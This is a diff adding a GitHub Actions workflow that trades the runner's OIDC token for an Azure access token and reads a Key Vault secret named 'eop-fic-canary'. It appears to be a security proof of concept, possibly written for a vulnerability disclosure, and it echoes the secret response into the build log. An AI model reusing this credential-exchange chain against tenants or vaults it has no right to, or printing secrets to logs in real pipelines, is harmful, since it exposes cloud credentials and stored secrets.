@@ -1,0 +1,26 @@
+name: fic
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  read:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exchange and read canary
+        env:
+          TENANT: daa028e4-8850-4761-a64e-39ce27aadbe6
+          CLIENT_ID: db71ca40-51a2-4533-b5a8-1ede4fa8293f
+          VAULT: msrceopfic69oak5qw
+        run: |
+          set -e
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
+          echo "oidc_len=${#OIDC}"
+          RESP=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token"             -d grant_type=client_credentials -d client_id=$CLIENT_ID -d scope=https://vault.azure.net/.default             -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer             -d client_assertion=$OIDC)
+          TOKEN=$(echo "$RESP" | jq -r .access_token)
+          if [ "$TOKEN" = "null" ]; then echo "TOKEN_FAILURE"; echo "$RESP" | jq -r '.error_description // .error'; exit 1; fi
+          SECRET=$(curl -s -H "Authorization: Bearer $TOKEN" "https://$VAULT.vault.azure.net/secrets/eop-fic-canary?api-version=7.4")
+          echo "secret_response=$SECRET"
+          echo "$SECRET" | grep -q MSRC_FIC_CANARY && echo EOP_FIC_CANARY_READ
